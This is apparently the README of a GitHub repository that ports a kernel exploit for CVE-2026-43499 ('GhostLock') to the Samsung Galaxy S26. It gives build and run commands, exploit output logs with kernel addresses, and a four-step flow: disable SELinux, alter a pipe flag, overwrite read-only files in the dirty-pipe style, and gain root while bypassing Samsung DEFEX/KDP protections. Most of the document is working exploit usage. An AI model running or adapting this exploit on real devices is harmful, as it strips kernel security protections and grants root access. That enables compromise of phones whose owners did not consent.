# GhostLock (CVE-2026-43499) for Galaxy S26
As of 2026-08-11, other exploits for GhostLock don't work on S26. This repo utilize another method (dirty-pipe like file overwrite) to port it to S26 kernel.

Dirty-pipe like method can easily bypass samsung DEFEX/KDP and doesn't rely on ashmem. It is suitable for 6.12 kernel Galaxy devices (Galaxy S26 series).

All done via kernelsnitch'ed address or linearmap. KASLR bypass is not needed at all.

Currently only supports the following device.

| Payload | Compatible models | Kernel version | Status |
| --- | --- | --- | --- |
| `m1q-S942QOPU1AZDE` | Galaxy S26 | `6.12.30-android16-5-pe553c2c-abogkiS942QOPU1AZDE-4k` | Working |

For porting another device or another firmware version, modify target.h and rebuild it.

# Build
```sh
git clone (this repo)
cd (this repo)
cd IonStack/CVE-2026-43499/exploit
export ANDROID_NDK_HOME=(your ndk path)
make PROJECT=m1q-S942QOPU1AZDE
```

And, build ksud + kernelsu.ko using [this tree](https://github.com/polygraphene/KernelSU/tree/a5531763971cf034e3f630d31654189a148e5f81) by [this instruction](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/blob/61a543e206bf503b54ffb2ac8329c2cd1b99a695/kernelsu/README.md).
This tree contains [a patch from BuSung-dev/Root-My-Galaxy](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/blob/61a543e206bf503b54ffb2ac8329c2cd1b99a695/kernelsu/patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch) and 6.12 adaptation.

# Run
```sh
$ adb push $KERNELSU/target/aarch64-linux-android/release/ksud /data/local/tmp
$ adb push (this repo)/IonStack/CVE-2026-43499/exploit/build/m1q-S942QOPU1AZDE/bin/preload.so /data/local/tmp
$ adb shell env LD_PRELOAD=/data/local/tmp/preload.so sh
[23:31:28.845354] [+] preload starting pid=7080
[23:31:28.845737] [+] startup context pid=7080 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[23:31:28.845747] [+] startup limits pid=7080 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[23:31:28.845753] [+] build config pid=7080 label=m1q-S942QOPU1AZDE-pipe-flag slide=pselect main=pselect
[23:31:28.845762] [+] p0 profile pid=7080 phys_offset=0000000080000000 kernel_phys_load=00000000c7800000 delta=0000000047800000 slide_logger=ffffff8049d221c0 bootid_data=ffffff8049e4cf48 init_task=ffffff8049d2d040 root_tg=ffffff8049f63580 sysctl_bootid=ffffff804a092e70
[23:31:28.845874] [*] data_addr(SELINUX_ENFORCING) = ffffff8049fafb08
[23:31:28.845891] [*] Start selinux. enforcing=1
[23:31:29.001248] [*] parameters cpu (16) mm_struct sz (500) mm slab order (3) thread cnt (8) collisions (4) mte disabled
[23:31:29.183991] [*] start finding collisisons
[23:31:29.184173] [*] target    00000079fb49a0c8
...
[23:31:43.304640] [*] enforcing=0
[23:31:43.304688] [*] Selinux phase done. Go to pipe flag phase.
[23:31:43.532363] [*] parameters cpu (16) mm_struct sz (500) mm slab order (3) thread cnt (8) collisions (4) mte disabled
[23:31:43.648467] [*] start finding collisisons
[23:31:43.648593] [*] target    00000079fb49a0c8
...
[23:31:48.571070] [+] pipe overwrite succeeded.
[23:31:48.571095] [*] pselect route done calls=1 success=1 step=0 errno=0
[23:31:48.574389] [*] Executing setprop ctl.start vendor.modprobe

```
Then, install KernelSU Manager.

logcat should include logs like the followings if succeeded.
```
$ logcat | grep GHOSTLOCK
08-12 11:09:19.905 24264 24264 I GHOSTLOCK: uid=0(root) gid=0(root) groups=0(root),1000(system) context=u:r:vendor_modprobe:s0
08-12 11:09:19.909 24265 24265 I GHOSTLOCK: [*] Am I root? uid=0
08-12 11:09:19.919 24265 24265 I GHOSTLOCK: [*] cp result=0
08-12 11:09:20.062 24265 24265 I GHOSTLOCK: [*] ksud result=0
```

# Flow
1. Disable selinux by vuln
2. Modify pipe flag by vuln (add `can_merge` flag)
3. Overwrite readonly file like dirty-pipe
4. Get root

# Acknowledgments
- [Nebula Security](https://github.com/NebuSec/CyberMeowfia): Vulnerability and original exploit
- [@JoinChang](https://github.com/JoinChang/ghostlock-oneplus): Idea for disabling selinux
- [@BuSung-dev](https://github.com/BuSung-dev/Root-My-Galaxy): Idea for bypassing security of Samsung DEFEX/KDP and good documentation for porting
- [@veritas501](https://github.com/veritas501/pipe-primitive): Idea for triggering dirty-pipe like behavior from kernel memory corruption
- [@lukasmaar](https://github.com/lukasmaar/kernelsnitch): This exploit is heavily dependent on kernelsnitch

